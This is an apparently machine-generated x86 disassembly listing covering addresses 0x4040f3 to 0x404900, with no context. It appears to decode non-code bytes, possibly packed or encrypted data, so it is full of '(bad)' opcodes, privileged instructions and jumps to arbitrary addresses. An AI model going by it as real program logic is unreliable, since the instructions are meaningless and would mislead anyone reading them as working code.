  4040f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040f4:	sub    ebx,ebp
  4040f6:	adc    bh,al
  4040f8:	xor    al,0xa8
  4040fa:	loop   0x404088
  4040fc:	popf   
  4040fd:	je     0x404143
  4040ff:	test   al,0x39
  404101:	and    al,BYTE PTR [eax]
  404103:	out    dx,eax
  404104:	rol    BYTE PTR [edx+0x29],0x13
  404108:	inc    ebx
  404109:	ret    
  40410a:	imul   esp,DWORD PTR ds:0x3901ae54,0xffffff83
  404111:	and    dl,BYTE PTR [ebp+0x62]
  404114:	push   ecx
  404115:	loop   0x404103
  404117:	inc    edx
  404118:	mov    ds:0x3f3b8a10,eax
  40411d:	adc    BYTE PTR [esi],cl
  40411f:	shl    ebx,0xe1
  404122:	and    cl,BYTE PTR [eax+0x3f5b0e92]
  404128:	and    esp,DWORD PTR [ecx-0x29bd4698]
  40412e:	xor    eax,0x3b1bbaa9
  404133:	sar    DWORD PTR [edi+0x1e],cl
  404136:	inc    edi
  404137:	ret    
  404138:	retf   0x13e2
  40413b:	mov    DWORD PTR [ebx+0x7bfc0819],edx
  404141:	pop    ss
  404142:	or     al,0x65
  404144:	pop    edx
  404145:	out    0x41,al
  404147:	in     al,0x9
  404149:	bound  esp,QWORD PTR fs:[ecx]
  40414c:	ins    DWORD PTR es:[edi],dx
  40414d:	mov    cl,0x88
  40414f:	mov    ah,0x66
  404151:	pop    edx
  404152:	(bad)  
  404153:	jne    0x404134
  404155:	nop
  404156:	leave  
  404157:	xor    al,0xa0
  404159:	icebp  
  40415a:	outs   dx,DWORD PTR ds:[esi]
  40415b:	(bad)  [esi+0x4b]
  40415e:	mov    edx,0x41637c94
  404163:	mov    ds:0xecc0cb8,eax
  404168:	arpl   si,bx
  40416a:	js     0x404121
  40416c:	push   esi
  40416d:	stos   DWORD PTR es:[edi],eax
  40416e:	gs push 0x6a5d5968
  404174:	lea    edx,[ecx+ebp*8-0x35]
  404178:	pop    es
  404179:	xchg   DWORD PTR [edx+0x6f],ebx
  40417c:	add    ah,0x63
  40417f:	or     eax,0xaa8f799
  404184:	pop    esp
  404185:	lods   eax,DWORD PTR ds:[esi]
  404186:	and    BYTE PTR [esi+0xc],bh
  404189:	imul   ebx,DWORD PTR [edi],0x3b
  40418c:	inc    edx
  40418d:	xchg   ebx,eax
  40418e:	or     ebp,DWORD PTR [esi+esi*1]
  404191:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404192:	cmp    eax,esi
  404194:	or     DWORD PTR [esp+edx*8+0x54],esi
  404198:	jne    0x40412b
  40419a:	das    
  40419b:	cli    
  40419c:	dec    eax
  40419d:	call   0x90f1:0xccc9ab9
  4041a4:	mov    ah,0x76
  4041a6:	mov    ecx,0xda72baea
  4041ab:	add    BYTE PTR [ecx+0x298cbf4d],bh
  4041b1:	mov    BYTE PTR [edi-0x76],bl
  4041b4:	arpl   dx,bp
  4041b6:	mov    esi,DWORD PTR [edi+0x5]
  4041b9:	ror    BYTE PTR [esi+eax*1+0x3a9d88ee],0xec
  4041c1:	or     BYTE PTR [edx-0x2b],cl
  4041c4:	mov    ch,0x9b
  4041c6:	pop    eax
  4041c7:	fiadd  WORD PTR [ebx-0x12033eae]
  4041cd:	popf   
  4041ce:	call   0x3c6c:0x328eed56
  4041d5:	jne    0x4041de
  4041d7:	mov    bh,bl
  4041d9:	test   BYTE PTR [ecx],dl
  4041db:	xchg   ebx,eax
  4041dc:	hlt    
  4041dd:	fwait
  4041de:	add    al,0xee
  4041e0:	out    0x32,eax
  4041e2:	cdq    
  4041e3:	iret   
  4041e4:	call   0xcbf59a5e
  4041e9:	mov    ecx,edx
  4041eb:	(bad)  
  4041ec:	xor    dl,BYTE PTR [eax-0x3d]
  4041ef:	out    dx,al
  4041f0:	gs call 0x8d153608
  4041f6:	adc    bh,dl
  4041f8:	punpcklbw mm3,DWORD PTR [edx]
  4041fb:	es sbb DWORD PTR ds:[edx],ebp
  4041ff:	sti    
  404200:	dec    ebx
  404201:	push   esi
  404202:	jl     0x40421c
  404204:	es pusha 
  404206:	pop    es
  404207:	xor    BYTE PTR [eax-0x3b],ch
  40420a:	in     eax,0x20
  40420c:	cmc    
  40420d:	push   cs
  40420e:	mov    esi,0x4e295942
  404213:	xchg   edx,eax
  404214:	retf   0x8df2
  404217:	lahf   
  404218:	(bad)  
  40421a:	jb     0x404262
  40421c:	jmp    0x736b1a62
  404221:	add    eax,0x26788465
  404226:	push   esp
  404227:	int3   
  404228:	pop    ebx
  404229:	jp     0x404262
  40422b:	push   ecx
  40422c:	loope  0x4042a0
  40422e:	shl    BYTE PTR [edx],1
  404230:	xchg   esi,eax
  404231:	rol    BYTE PTR [ecx+ecx*8-0x638d4aba],cl
  404238:	shl    DWORD PTR [ecx-0x7e],cl
  40423b:	xor    eax,0xbcbd7611
  404240:	outs   dx,BYTE PTR gs:[esi]
  404242:	nop
  404243:	mov    dh,0xf6
  404245:	mov    esi,0x9c3b80d4
  40424a:	mov    ch,0xf3
  40424c:	std    
  40424d:	xor    al,0x4a
  40424f:	mov    ah,0x5a
  404251:	fmul   st(4),st
  404253:	ret    
  404254:	enter  0x75d9,0x1f
  404258:	popa   
  404259:	xor    eax,0xf2ed09b2
  40425e:	imul   edx,DWORD PTR [esi-0x1418e0d8],0xffffffc6
  404265:	in     eax,0x60
  404267:	pop    ebx
  404268:	dec    edi
  404269:	aaa    
  40426a:	pop    ebp
  40426c:	(bad)  
  40426d:	pop    ss
  40426e:	jo     0x404205
  404270:	pop    eax
  404271:	lods   eax,DWORD PTR ds:[esi]
  404272:	lock mov ch,0x31
  404275:	dec    ecx
  404276:	dec    esp
  404277:	dec    ebp
  404278:	push   ebp
  404279:	xlat   BYTE PTR ds:[ebx]
  40427a:	mov    cl,0x39
  40427c:	jbe    0x4042e2
  40427e:	mov    ah,0x5c
  404280:	test   eax,0x9896d03b
  404285:	adc    al,0x17
  404287:	call   0xba330104
  40428c:	aam    0x45
  40428e:	xchg   edi,eax
  40428f:	xor    DWORD PTR es:[eax-0x4],edi
  404293:	outs   dx,BYTE PTR ds:[esi]
  404294:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404295:	mov    cl,0xd2
  404297:	pop    edi
  404298:	push   0x33c3d4f1
  40429d:	mov    al,BYTE PTR [edx]
  40429f:	pop    ss
  4042a0:	call   0x6c6b1939
  4042a5:	retf   
  4042a6:	cmp    BYTE PTR cs:[ebp-0x27c241f8],dh
  4042ad:	pop    ss
  4042ae:	push   ds
  4042af:	mov    ecx,0xd49601ee
  4042b4:	fst    st(4)
  4042b6:	test   al,0x94
  4042b8:	imul   esi,DWORD PTR [esp+ecx*8-0x60],0x52
  4042bd:	rcl    DWORD PTR [esi+0x50bf1a55],cl
  4042c3:	mov    ?,WORD PTR [ebp+0x4a]
  4042c6:	lahf   
  4042c7:	cld    
  4042c8:	sar    DWORD PTR [edx+0x63],cl
  4042cb:	xor    BYTE PTR [edx],bh
  4042cd:	pop    ebp
  4042ce:	inc    esi
  4042cf:	mov    esi,0x926436d8
  4042d4:	stc    
  4042d5:	dec    eax
  4042d6:	lods   al,BYTE PTR ds:[esi]
  4042d7:	mov    DWORD PTR [edx],ebp
  4042d9:	mov    dl,ch
  4042db:	pop    ss
  4042dc:	enter  0xbbfe,0x37
  4042e0:	stos   DWORD PTR es:[edi],eax
  4042e1:	clc    
  4042e2:	hlt    
  4042e3:	jl     0x4042bc
  4042e5:	push   0xffffffae
  4042e7:	aaa    
  4042e8:	inc    eax
  4042e9:	push   eax
  4042ea:	leave  
  4042eb:	pop    ebp
  4042ec:	jge    0x40427b
  4042ee:	stc    
  4042ef:	pop    ecx
  4042f0:	xor    bh,BYTE PTR ds:0x8d866529
  4042f6:	pop    eax
  4042f7:	fbstp  TBYTE PTR [edx-0x4cbab847]
  4042fd:	sbb    al,cl
  4042ff:	int    0x49
  404301:	mov    ebp,0xbef40ca4
  404306:	dec    eax
  404307:	(bad)  
  404308:	rcr    ebx,cl
  40430a:	add    al,0x86
  40430c:	inc    esp
  40430d:	inc    ecx
  40430e:	icebp  
  40430f:	or     BYTE PTR [edi-0x57],ch
  404312:	mov    eax,0x980063c6
  404317:	jo     0x40432a
  404319:	adc    BYTE PTR [eax-0xa9c2cc],bh
  40431f:	sub    BYTE PTR [ebx+0x7cf88228],cl
  404325:	retf   0x4b12
  404328:	outs   dx,BYTE PTR ds:[esi]
  404329:	and    dl,BYTE PTR [edx+0x1]
  40432c:	jae    0x404319
  40432e:	lds    ebx,FWORD PTR [ecx]
  404330:	(bad)  
  404331:	pop    ebx
  404332:	sbb    DWORD PTR [ebx+0x16],esi
  404335:	hlt    
  404336:	repz and ch,cl
  404339:	xor    bh,BYTE PTR [edi-0xcf80159]
  40433f:	aaa    
  404340:	jb     0x404316
  404342:	sbb    edi,DWORD PTR [edi+0x31]
  404345:	fcom   DWORD PTR [edi+0x155d04bd]
  40434b:	jnp    0x404362
  40434d:	pop    esp
  40434e:	unpcklps xmm4,XMMWORD PTR [ebx]
  404351:	mov    gs:0xef48abc,eax
  404357:	pop    ebp
  404358:	out    0x93,al
  40435a:	ja     0x404360
  40435c:	(bad)  
  40435d:	mov    al,ds:0xdd47d868
  404362:	sbb    eax,edx
  404364:	test   eax,0x82219fd
  404369:	sar    DWORD PTR [edx+0x2657dd43],1
  40436f:	mov    ebp,0x7a2338db
  404374:	cmp    BYTE PTR [eax],al
  404376:	mov    dl,0x8f
  404378:	and    al,0xde
  40437a:	retf   0x7f2f
  40437d:	scas   al,BYTE PTR es:[edi]
  40437e:	pop    esi
  40437f:	and    eax,0x93cb88d9
  404384:	mov    dh,0xd6
  404386:	imul   eax,DWORD PTR [edi+0x6a908f82],0xbe019d21
  404390:	ficomp DWORD PTR [ebx+0x72414e62]
  404396:	or     dl,cl
  404398:	xchg   esi,eax
  404399:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40439a:	mov    ds,WORD PTR [edi+0x6e352e56]
  4043a0:	sub    eax,0xdbd29fb8
  4043a5:	mov    ah,0xb3
  4043a7:	ret    0x5409
  4043aa:	jmp    0x6ea2:0x26a19000
  4043b1:	or     ah,BYTE PTR [edx]
  4043b3:	xchg   esp,eax
  4043b4:	outs   dx,DWORD PTR ds:[esi]
  4043b5:	push   cs
  4043b6:	mov    eax,ds:0xaf5f5261
  4043bb:	into   
  4043bc:	xchg   ebx,eax
  4043bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043be:	adc    eax,0xc3732f00
  4043c3:	test   DWORD PTR [ecx+0x7a428993],edx
  4043c9:	or     al,0x3c
  4043cb:	lods   al,BYTE PTR ds:[esi]
  4043cc:	jmp    0x4043d4
  4043ce:	ja     0x4043c6
  4043d0:	pop    ebp
  4043d1:	les    ebx,FWORD PTR [edx+0x6e509bf0]
  4043d7:	dec    ecx
  4043d8:	jne    0x40438b
  4043da:	ins    BYTE PTR es:[edi],dx
  4043db:	(bad)  
  4043dc:	rol    DWORD PTR [esi+0x77],cl
  4043df:	jb     0x404394
  4043e1:	mov    ch,0xdc
  4043e3:	jmp    0xd700:0x76148aae
  4043ea:	les    ebp,FWORD PTR [eax-0x5a625bd5]
  4043f0:	jb     0x40441b
  4043f2:	std    
  4043f3:	add    edx,DWORD PTR [ecx-0x2]
  4043f6:	ror    BYTE PTR [ecx+edx*2+0xe3367aa],0x76
  4043fe:	sbb    bl,BYTE PTR [eax+eax*8+0x3233e805]
  404405:	adc    DWORD PTR [ebp+edx*4-0x4ab6d933],esp
  40440c:	xchg   edx,eax
  40440d:	idiv   BYTE PTR [esi]
  40440f:	aam    0xad
  404411:	xor    esp,DWORD PTR [esi]
  404413:	sahf   
  404414:	dec    eax
  404415:	or     ch,dl
  404417:	adc    ecx,edi
  404419:	and    DWORD PTR [esi+0x5107ad94],0xffffffbf
  404420:	aam    0x7
  404422:	and    eax,0x139cf355
  404427:	nop
  404428:	mov    ds:0xdf2bcc9a,al
  40442d:	cli    
  40442e:	daa    
  40442f:	mov    dl,BYTE PTR [ecx+0x2a]
  404432:	jecxz  0x4043f9
  404434:	xlat   BYTE PTR ds:[ebx]
  404435:	or     ebp,DWORD PTR [edx-0x6]
  404438:	adc    ebp,DWORD PTR [esi-0x4f]
  40443b:	xchg   ebx,eax
  40443c:	mov    ch,0xa8
  40443f:	push   0x614caf7f
  404444:	pusha  
  404445:	xchg   esi,eax
  404446:	dec    ecx
  404447:	mov    ds:0x39c567de,eax
  40444c:	push   es
  40444d:	les    esi,FWORD PTR [eax-0x5]
  404450:	and    al,0x38
  404452:	mov    ah,0x66
  404454:	mov    edi,0xd7e76f29
  404459:	pop    edi
  40445a:	out    0xce,eax
  40445c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40445d:	mov    DWORD PTR [eax+eax*8],eax
  404460:	mov    bl,0x68
  404462:	fwait
  404463:	test   eax,0x419f9008
  404468:	pop    edi
  404469:	pop    ds
  40446a:	jne    0x40444e
  40446c:	sbb    al,0x58
  40446e:	pop    eax
  40446f:	pop    ss
  404470:	popa   
  404471:	sbb    bh,BYTE PTR ss:[esi]
  404474:	sbb    DWORD PTR [esi],edx
  404476:	out    0x22,eax
  404478:	xor    DWORD PTR [esi-0x36714a63],edx
  40447e:	dec    esi
  40447f:	inc    esi
  404480:	jecxz  0x40443c
  404482:	pop    edi
  404483:	xchg   ebp,eax
  404484:	mov    ds:0xc902e873,eax
  404489:	pop    esi
  40448a:	dec    edx
  40448b:	xchg   edx,eax
  40448c:	push   ebx
  40448d:	lds    ecx,FWORD PTR [ecx]
  40448f:	sbb    bl,BYTE PTR [edx]
  404491:	rcr    DWORD PTR [esi+0x8b5fc93],cl
  404497:	out    0x69,eax
  404499:	shl    BYTE PTR [esi],cl
  40449b:	xor    al,0x0
  40449d:	mov    eax,ds:0x6ada1aac
  4044a2:	lock das 
  4044a4:	out    dx,eax
  4044a5:	cmp    al,0xdf
  4044a7:	push   esi
  4044a8:	lods   eax,DWORD PTR ds:[esi]
  4044a9:	cld    
  4044aa:	sub    eax,0x1a0fba32
  4044af:	inc    ebx
  4044b0:	div    DWORD PTR [ebp+ebp*2-0x12]
  4044b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044b5:	ss jbe 0x404537
  4044b8:	fisub  WORD PTR [esi]
  4044bb:	loop   0x404518
  4044bd:	outs   dx,DWORD PTR ds:[esi]
  4044be:	pop    ds
  4044bf:	or     DWORD PTR [ebp+0x1522c5c0],eax
  4044c5:	int    0x12
  4044c7:	push   ebx
  4044c8:	sbb    cl,BYTE PTR [edx]
  4044ca:	push   ss
  4044cb:	shl    DWORD PTR [edi+0x260de434],0xd
  4044d2:	pop    es
  4044d3:	inc    ecx
  4044d4:	mov    dh,0x13
  4044d6:	lods   eax,DWORD PTR ds:[esi]
  4044d7:	mov    bh,0x8d
  4044d9:	or     BYTE PTR [edx-0x22ddd2ab],cl
  4044df:	or     ch,BYTE PTR [edx-0x7a4fff7c]
  4044e5:	fs mov dh,0x4f
  4044e8:	data16 test al,0x38
  4044eb:	icebp  
  4044ec:	into   
  4044ed:	xchg   esp,eax
  4044ee:	daa    
  4044ef:	inc    esi
  4044f0:	(bad)  
  4044f1:	mov    edi,0x1a95cf1a
  4044f6:	sub    BYTE PTR [ebp-0x40519ae6],dl
  4044fc:	xchg   ecx,eax
  4044fd:	into   
  4044fe:	jb     0x404528
  404500:	sahf   
  404501:	call   0x9d9464fe
  404506:	add    al,bl
  404508:	fwait
  404509:	and    DWORD PTR [edi+0x887e5ab],0x8
  404510:	jmp    0x8d474a61
  404515:	call   0x1604:0xc751c2f4
  40451c:	mov    ecx,0x94e8d7d1
  404521:	jg     0x4044ae
  404523:	nop
  404524:	int    0xae
  404526:	or     eax,0x6599184c
  40452b:	icebp  
  40452c:	dec    ebx
  40452d:	inc    esp
  40452e:	popf   
  40452f:	and    eax,0xc0981ab5
  404534:	retf   
  404535:	rcl    BYTE PTR [edi-0x7b],0x85
  404539:	shl    DWORD PTR [eax],1
  40453b:	mov    ds:0xa6d23dc4,al
  404540:	inc    ebx
  404541:	sbb    eax,0xed79a2bd
  404546:	enter  0x2532,0x78
  40454a:	pop    es
  40454b:	add    BYTE PTR [edx+0x71e938ec],0xd2
  404552:	mul    ebx
  404554:	aaa    
  404555:	(bad)  
  404556:	pop    ebx
  404557:	bound  esp,QWORD PTR [edi]
  404559:	dec    edx
  40455a:	sub    edi,DWORD PTR [edx]
  40455c:	jne    0x40452f
  40455e:	cwde   
  40455f:	int3   
  404560:	inc    ebx
  404561:	pop    ss
  404562:	mov    ecx,0x34d723a7
  404567:	mov    esi,0x2b47d6ae
  40456c:	xchg   ecx,eax
  40456d:	fcmovnb st,st(0)
  40456f:	fidivr WORD PTR [edx]
  404571:	push   ecx
  404572:	ret    0x5dd
  404575:	outs   dx,BYTE PTR ds:[esi]
  404576:	inc    esp
  404577:	jmp    0xeb1f:0xc5079041
  40457e:	mov    eax,0x8adcd1d
  404583:	mov    fs,WORD PTR [eax]
  404585:	mov    dh,0x9e
  404587:	ror    eax,0xce
  40458a:	sub    BYTE PTR [edx+eax*2-0x65],dh
  40458e:	pop    eax
  40458f:	xchg   BYTE PTR [edx+0x44542e96],dl
  404595:	or     BYTE PTR [eax+0x45],ah
  404598:	mov    DWORD PTR [edx],ebp
  40459a:	mul    esi
  40459c:	lea    edx,[edx+0x31]
  40459f:	sti    
  4045a0:	sbb    al,cl
  4045a2:	sbb    bh,al
  4045a4:	iret   
  4045a5:	fnsave [edx-0x2a32716a]
  4045ab:	(bad)  
  4045ac:	push   DWORD PTR [eax-0x48]
  4045af:	fadd   st,st(6)
  4045b1:	popa   
  4045b2:	mov    ebx,0x3beeabd0
  4045b7:	add    BYTE PTR [ecx+edi*1+0x4a0aeb14],0x2b
  4045bf:	loope  0x40457f
  4045c1:	test   al,0xa2
  4045c3:	push   ds
  4045c4:	dec    eax
  4045c5:	jns    0x40456b
  4045c7:	es dec edx
  4045c9:	push   esi
  4045ca:	jp     0x40464a
  4045cc:	inc    ebp
  4045cd:	mov    ds:0xca10dd9d,eax
  4045d2:	fcomp  QWORD PTR [eax-0x21]
  4045d5:	test   BYTE PTR [ecx+ebp*4+0x3c66ef7b],0x94
  4045dd:	rdpmc  
  4045df:	mov    ebx,0x3bc86e01
  4045e4:	or     al,0x26
  4045e6:	cmp    al,0x81
  4045e8:	fst    DWORD PTR ds:0x5112d6c8
  4045ee:	retf   
  4045ef:	imul   ecx,DWORD PTR [ecx],0xb7e48cef
  4045f5:	imul   esp,DWORD PTR [ebp+0x67],0xa40f95f7
  4045fc:	les    edx,FWORD PTR [ecx+edx*4-0xb]
  404600:	or     BYTE PTR gs:[ebx-0x324f0352],al
  404607:	ins    BYTE PTR es:[edi],dx
  404608:	dec    ch
  40460a:	sbb    DWORD PTR [ebp-0x72],0x153c5c50
  404611:	jg     0x40464a
  404613:	cmp    al,0xf1
  404615:	data16 cmp al,0x38
  404618:	repnz scas al,BYTE PTR es:[edi]
  40461a:	xchg   edi,eax
  40461b:	pop    ecx
  40461c:	cdq    
  40461d:	mov    ebp,0xe27bdfe9
  404622:	jle    0x4045fc
  404624:	add    al,BYTE PTR [esi+esi*4]
  404627:	xchg   edi,eax
  404628:	sbb    ah,dl
  40462a:	push   edi
  40462b:	push   edx
  40462c:	retf   
  40462d:	sbb    al,0xdb
  40462f:	into   
  404630:	out    0x4d,eax
  404632:	wbinvd 
  404634:	mov    ebx,0xbc3c4cc0
  404639:	(bad)  
  40463a:	or     al,BYTE PTR [edi+0x11]
  40463d:	gs mov bh,0xa0
  404640:	loopne 0x404646
  404642:	adc    dl,bl
  404644:	stc    
  404645:	pop    edi
  404646:	mov    esp,0xb3dcb07d
  40464b:	outs   dx,DWORD PTR ds:[esi]
  40464c:	dec    edi
  40464d:	ret    
  40464e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40464f:	push   ebp
  404650:	in     eax,dx
  404651:	(bad)  
  404652:	sbb    BYTE PTR [ebx],bh
  404654:	mov    ebp,ss
  404656:	call   0x2e9a:0x57c99f6e
  40465d:	test   edx,esi
  40465f:	fstp   TBYTE PTR [esi]
  404661:	inc    ebx
  404662:	and    DWORD PTR [ebx-0x4f],eax
  404665:	sbb    al,0x4e
  404667:	in     al,0x3a
  404669:	add    bh,BYTE PTR [eax]
  40466b:	sub    al,bh
  40466d:	mov    ebx,0xaee4bab4
  404672:	jle    0x4046d3
  404674:	call   0x3818d3fd
  404679:	call   0xe79b05d0
  40467e:	outs   dx,DWORD PTR ds:[esi]
  40467f:	int    0x58
  404681:	scas   al,BYTE PTR es:[edi]
  404682:	fild   QWORD PTR [edi+ebp*4]
  404685:	adc    ah,BYTE PTR [eax-0x29a3f08f]
  40468b:	jge    0x4046c8
  40468d:	mov    edi,0xd1733d17
  404692:	jb     0x4046b6
  404694:	fcompp 
  404696:	xchg   esp,eax
  404697:	xchg   ch,bl
  404699:	stos   DWORD PTR es:[edi],eax
  40469a:	inc    edi
  40469b:	in     al,0xe8
  40469d:	jb     0x40471c
  40469f:	rcl    esp,0x21
  4046a2:	adc    al,0xa9
  4046a4:	aam    0xe8
  4046a6:	in     eax,0xb1
  4046a8:	jns    0x404633
  4046aa:	and    BYTE PTR es:[edi+0xd0b8e18],0x9e
  4046b2:	xchg   edi,eax
  4046b3:	bnd jl 0x404672
  4046b6:	and    ecx,DWORD PTR [edx-0x5c397253]
  4046bc:	pop    esi
  4046bd:	cwde   
  4046be:	or     DWORD PTR [edx-0x7d],edx
  4046c1:	push   ss
  4046c2:	lods   eax,DWORD PTR ds:[esi]
  4046c3:	scas   al,BYTE PTR es:[edi]
  4046c4:	sar    edi,cl
  4046c6:	sbb    BYTE PTR [edx-0x7a],dh
  4046c9:	nop
  4046ca:	xchg   BYTE PTR [ebp*2-0x72099c32],dh
  4046d1:	iret   
  4046d2:	cs cli 
  4046d4:	mov    bl,0x14
  4046d6:	inc    ebx
  4046d7:	lea    ebp,[eax-0x79]
  4046da:	hlt    
  4046db:	fstp   TBYTE PTR [edx]
  4046dd:	jne    0x404673
  4046df:	pop    esp
  4046e0:	fpatan 
  4046e2:	sub    ebx,eax
  4046e4:	xchg   DWORD PTR [esi],esp
  4046e6:	sbb    eax,0xa27019f7
  4046eb:	sahf   
  4046ec:	lea    ebx,[esi]
  4046ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046ef:	outs   dx,BYTE PTR ds:[esi]
  4046f0:	rcr    eax,cl
  4046f2:	dec    ebx
  4046f3:	ret    0x99a5
  4046f6:	mov    bh,0x5d
  4046f8:	repz rcr BYTE PTR [ecx-0x31],1
  4046fc:	sahf   
  4046fd:	leave  
  4046fe:	jo     0x404720
  404700:	das    
  404701:	fwait
  404702:	and    ch,BYTE PTR [edx-0x531665bc]
  404708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404709:	loop   0x40476d
  40470b:	loop   0x40477b
  40470d:	call   0xd1385bef
  404712:	jg     0x404732
  404714:	retf   
  404715:	bound  esp,QWORD PTR [esi]
  404717:	neg    BYTE PTR [edi+0x339b9fe]
  40471d:	shl    BYTE PTR [ecx+0x765d321f],0x88
  404724:	push   0x6550a7ae
  404729:	lock jnp 0x404755
  40472c:	push   ss
  40472d:	iret   
  40472e:	(bad)  
  40472f:	call   0xba45cb71
  404734:	shl    DWORD PTR [ebx+0x196991a3],0x66
  40473b:	push   ds
  40473c:	aad    0xad
  40473e:	mov    eax,ds:0xd0a666e1
  404743:	or     ebp,DWORD PTR [edi]
  404745:	into   
  404746:	popf   
  404747:	and    BYTE PTR [eax-0x16521e9f],bl
  40474d:	mov    ecx,0x91c2da3f
  404752:	lds    eax,FWORD PTR [edx+0x6]
  404755:	(bad)  
  404756:	shr    eax,1
  404758:	sub    dl,BYTE PTR [edi+ebx*8]
  40475b:	xor    bl,BYTE PTR [edx]
  40475d:	or     DWORD PTR [edi-0x3],ecx
  404760:	pop    ebx
  404761:	je     0x404784
  404763:	retf   
  404764:	rcr    DWORD PTR [edx-0x40efa270],1
  40476a:	daa    
  40476b:	test   al,0x10
  40476d:	pop    esi
  40476e:	loope  0x404785
  404770:	pop    edi
  404771:	fnstsw WORD PTR [ecx+edi*4-0xe]
  404775:	xchg   dx,ax
  404777:	jg     0x40470d
  404779:	jecxz  0x40472d
  40477b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40477c:	or     edi,0x722d1041
  404782:	(bad)  
  404783:	jmp    0xa39e:0x4ac9640f
  40478a:	xchg   esi,eax
  40478b:	sbb    ch,ch
  40478d:	mov    al,ss:0x377f4f0
  404793:	mov    ebp,0xef038365
  404798:	push   ebx
  404799:	(bad)  
  40479a:	out    dx,eax
  40479b:	push   es
  40479c:	sub    ch,BYTE PTR ds:0xe6a64db5
  4047a2:	push   esi
  4047a3:	sbb    ebp,DWORD PTR [ebx-0x4941386d]
  4047a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047aa:	sahf   
  4047ab:	jp     0x404784
  4047ad:	in     eax,dx
  4047ae:	push   esi
  4047af:	sbb    ebp,edx
  4047b1:	sti    
  4047b2:	mov    ecx,0xe6112041
  4047b7:	or     eax,0x1524ac0b
  4047bc:	adc    DWORD PTR [ebp-0x31240f03],ebx
  4047c2:	int3   
  4047c3:	mov    esi,0x1255d892
  4047c8:	shr    BYTE PTR ds:0x96eba646,0x60
  4047cf:	push   esi
  4047d0:	sbb    DWORD PTR [edi+0x218fa968],ebp
  4047d6:	shr    ecx,cl
  4047d8:	sbb    DWORD PTR [edi-0x1e],edx
  4047db:	cmp    ebp,ebx
  4047dd:	pop    esi
  4047de:	les    eax,FWORD PTR [edi+0x71ed9b9c]
  4047e4:	inc    eax
  4047e5:	dec    ebp
  4047e6:	or     al,0x43
  4047e8:	or     esi,DWORD PTR [eax]
  4047ea:	add    DWORD PTR [esp+eax*8-0x1bd4a882],edi
  4047f1:	sub    al,al
  4047f3:	nop
  4047f4:	dec    eax
  4047f5:	adc    al,BYTE PTR [ebx-0x37]
  4047f8:	rol    esi,cl
  4047fa:	cli    
  4047fb:	mov    gs,WORD PTR [ebp-0x6]
  4047fe:	mov    bh,0x57
  404800:	scas   eax,DWORD PTR es:[edi]
  404801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404802:	dec    edx
  404803:	gs ss je 0x404827
  404807:	pusha  
  404808:	repz push edx
  40480a:	imul   DWORD PTR [ebx]
  40480c:	imul   esp,ebx,0xbde17980
  404812:	shl    ecx,1
  404814:	iret   
  404815:	loop   0x4047bf
  404817:	daa    
  404818:	fcomp  QWORD PTR [ebx+0x3e]
  40481b:	mov    esp,0x756d2f95
  404820:	sub    BYTE PTR [ebx+esi*1-0x34],bl
  404824:	mov    esi,0x31bfcdf6
  404829:	mov    al,ds:0xc81706fa
  40482e:	test   al,0x1f
  404830:	sub    bh,bl
  404832:	or     al,0xf5
  404834:	ds xor ecx,esp
  404837:	pop    ecx
  404838:	(bad)  
  404839:	xchg   ecx,eax
  40483a:	(bad)  
  40483c:	js     0x404842
  40483e:	cli    
  40483f:	test   BYTE PTR [eax-0x6fc12631],al
  404845:	mov    WORD PTR [eax-0x69713946],ss
  40484b:	sub    ebx,DWORD PTR [edi]
  40484d:	seta   al
  404850:	push   edi
  404851:	jge    0x404848
  404853:	jno    0x404826
  404855:	fstp   st(6)
  404857:	jmp    0x732e81ef
  40485c:	sti    
  40485d:	or     dl,0x73
  404860:	jmp    0x6b6:0x2fb2f463
  404867:	push   esi
  404868:	jae    0x404866
  40486a:	ds pop eax
  40486c:	mov    ecx,esp
  40486e:	call   0x1d3ae266
  404873:	lock or ah,BYTE PTR [eax]
  404876:	call   0x1112:0x6c750ac0
  40487d:	lods   eax,DWORD PTR ds:[esi]
  40487e:	es adc cl,bl
  404881:	mov    DWORD PTR [edx+0xacc8864],esi
  404887:	xor    eax,0xcedbbc0a
  40488c:	ret    
  40488d:	enter  0xed9e,0x31
  404891:	jns    0x40486f
  404893:	out    dx,al
  404894:	fadd   st,st(7)
  404896:	outs   dx,DWORD PTR ds:[esi]
  404897:	cmp    eax,0x8f576df1
  40489c:	xchg   ecx,eax
  40489d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40489e:	dec    ecx
  40489f:	xchg   edi,eax
  4048a0:	jmp    FWORD PTR [ebx+0x23]
  4048a3:	mov    esp,0x52d257d5
  4048a8:	mov    dh,0x51
  4048aa:	jae    0x40485c
  4048ac:	or     dh,BYTE PTR [ecx-0x250758e1]
  4048b2:	mov    edi,0x695003f7
  4048b7:	cmc    
  4048b8:	lea    edi,[ecx+eax*8]
  4048bb:	sbb    al,0xe5
  4048bd:	dec    ebp
  4048be:	mov    dh,0xda
  4048c0:	cwde   
  4048c1:	fs inc eax
  4048c3:	ss ins BYTE PTR es:[edi],dx
  4048c5:	ins    DWORD PTR es:[edi],dx
  4048c6:	sbb    ebp,DWORD PTR [edx-0x70]
  4048c9:	jp     0x404858
  4048cb:	fld    TBYTE PTR [eax]
  4048cd:	frstor [esi-0x256fbe0]
  4048d3:	sbb    BYTE PTR [ebx-0x1],dh
  4048d6:	mov    ds:0x9add4d83,al
  4048db:	mov    ?,WORD PTR [edi+0x6339fdbd]
  4048e1:	fs or  eax,0xc69ef5f9
  4048e7:	(bad)  
  4048e8:	test   dh,0x21
  4048eb:	clc    
  4048ec:	enter  0xe0fb,0xa2
  4048f0:	sub    dh,BYTE PTR [eax]
  4048f2:	adc    DWORD PTR [ecx+0x3f],esp
  4048f5:	xor    eax,0x81ebca56
  4048fa:	sub    DWORD PTR [edi+0x5b92b679],edi
  404900:	jno    0x4048e6
